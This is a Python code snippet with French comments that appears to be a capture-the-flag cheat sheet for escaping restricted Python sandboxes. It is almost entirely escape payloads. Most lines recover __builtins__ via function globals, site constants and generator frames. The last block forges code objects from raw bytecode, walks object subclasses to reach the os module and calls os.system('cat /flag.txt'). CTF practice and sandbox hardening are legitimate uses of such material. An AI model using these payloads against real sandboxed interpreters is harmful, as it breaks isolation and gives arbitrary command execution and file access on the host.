```py
# recuperer builtins depuis des fonctions builtin definies globalement
# https://docs.python.org/3/library/functions.html
print.__self__
__build_class__.__self__
__import__.__self__

# recuperer builtins depuis les constantes du module site
# https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module
help.__call__.__builtins__ # ou __globals__
help.__repr__.__globals__["sys"] # chainable avec sys.modules
license.__repr__.__builtins__ # ou __globals__
license.__repr__.__globals__["sys"] # chainable avec sys.modules

# recuperer les builtins depuis une fonction definie
func.__globals__['__builtins__']
(lambda:...).__globals__

# recuperer builtins depuis des generateurs
(_ for _ in ()).gi_frame.f_builtins
(_ for _ in ()).gi_frame.f_globals["__builtins__"]
(await _ for _ in ()).ag_frame.f_builtins
(await _ for _ in ()).ag_frame.f_globals["__builtins__"]
[*([x.append((x[0].gi_frame.f_back.f_back.f_globals for _ in (1,))) or x[0] for x in [[]]][0])][0]["__builtins__"]

# peut etre obtenu depuis le type de l'objet
# https://robertchen.cc/blog/2018/07/27/tjctf18-abyss
async def code(): pass
ftype = type(lambda: None)
ctype = type(code().cr_code)
get_classes = ftype(ctype(1, 0, 1, 1, 67, b'i\x00j\x00j\x01j\x02\x83\x00S\x00', (None,), ('__class__', '__base__', '__subclasses__'), ('a',), 'aaa.py', 'get_classes', 7, b'\x00\x01', (), ()), {})
get_module = ftype(ctype(1, 0, 1, 1, 67, b'|\x00j\x00S\x00', (None,), ('_module',), ('warning_catcher',), 'aaa.py', 'get_module', 10, b'\x00\x01', (), ()), {})
classes = get_classes('')
warnings = classes[160]()
module = get_module(warnings)
os=module.sys.modules["os"]
os.system("cat /flag.txt")
```
